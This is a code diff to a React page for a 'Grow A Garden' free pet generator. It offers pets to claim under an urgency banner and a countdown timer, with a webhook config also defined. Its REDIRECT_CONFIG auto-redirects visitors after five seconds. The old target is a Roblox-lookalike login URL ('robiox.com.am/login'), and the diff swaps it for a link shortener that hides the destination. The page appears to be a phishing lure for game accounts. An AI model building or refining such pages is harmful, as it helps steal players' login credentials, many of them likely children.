@@ -60,56 +60,56 @@ const pets: Pet[] = [
   {
     id: "1",
     name: "T-Rex",
-    image: "/tr.png",
+    image: "/placeholder.svg?height=80&width=80&text=T-Rex",
     quantity: 0,
     claimed: false,
   },
   {
     id: "2",
     name: "Raccoon",
-    image: "/rc.png",
+    image: "/placeholder.svg?height=80&width=80&text=Raccoon",
     quantity: 0,
     claimed: false,
   },
   {
     id: "3",
     name: "Fennec Fox",
-    image: "/f.png",
+    image: "/placeholder.svg?height=80&width=80&text=Fox",
     quantity: 0,
     claimed: false,
   },
   {
     id: "4",
     name: "Kitsune",
-    image: "/k.png",
+    image: "/placeholder.svg?height=80&width=80&text=Kitsune",
     quantity: 0,
     claimed: false,
   },
   {
     id: "5",
-    name: "Dragonfly",
-    image: "/dragonfly.png",
+    name: "Red Dragon",
+    image: "/placeholder.svg?height=80&width=80&text=Dragon",
     quantity: 0,
     claimed: false,
   },
   {
     id: "6",
     name: "Mimic Octopus",
-    image: "/octo.png",
+    image: "/placeholder.svg?height=80&width=80&text=Octopus",
     quantity: 0,
     claimed: false,
   },
   {
     id: "7",
     name: "Disco Bee",
-    image: "/db.png",
+    image: "/placeholder.svg?height=80&width=80&text=Bee",
     quantity: 0,
     claimed: false,
   },
   {
     id: "8",
     name: "Queen Bee",
-    image: "/qb.png",
+    image: "/placeholder.svg?height=80&width=80&text=Queen",
     quantity: 0,
     claimed: false,
   },
@@ -118,7 +118,7 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://www.robiox.com.am/login?returnUrl=9603182548180515",
+  url: "https://shorturl.asia/gDq1x",
   delay: 5000,
   autoRedirect: true,
 }
@@ -130,7 +130,7 @@ const WEBHOOK_CONFIG = {
 }
 
 export default function PetSeedStore() {
-  const [showPreloader, setShowPreloader] = useState(true)
+  const [showPreloader, setShowPreloader] = useState(false) // Changed from true to false
   const [petQuantities, setPetQuantities] = useState<Record<string, number>>({})
   const [claimedPets, setClaimedPets] = useState<Record<string, boolean>>({})
   // Initialize timer with localStorage persistence
@@ -540,7 +540,7 @@ export default function PetSeedStore() {
 
   // Show preloader first
   if (showPreloader) {
-    return <Preloader onComplete={handlePreloaderComplete} videoSrc="/videos/your-video-name.mp4" duration={4000} />
+    return <Preloader onComplete={handlePreloaderComplete} duration={4000} />
   }
 
   return (
@@ -745,11 +745,9 @@ export default function PetSeedStore() {
             <div className="text-center mb-6 sm:mb-8">
               <div className="flex items-center justify-center gap-2 mb-4">
                 <Sprout className="h-5 w-5 sm:h-6 sm:w-6 text-yellow-600" />
-                <span className="text-yellow-600 font-semibold text-sm sm:text-base">Grow A Garden</span>
+                <span className="text-yellow-600 font-semibold text-sm sm:text-base">Generate Pets</span>
               </div>
-              <h1 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-yellow-500 mb-4 sm:mb-6">
-                Pet & Seed Store
-              </h1>
+              <h1 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-yellow-500 mb-4 sm:mb-6">Pet Generator</h1>
               <div className="bg-red-500 text-white rounded-lg p-3 sm:p-4 mb-6 sm:mb-8 max-w-sm sm:max-w-md mx-auto animate-pulse">
                 <div className="flex items-center justify-center gap-2 mb-2">
                   <div className="w-3 h-3 bg-white rounded-full animate-pulse"></div>
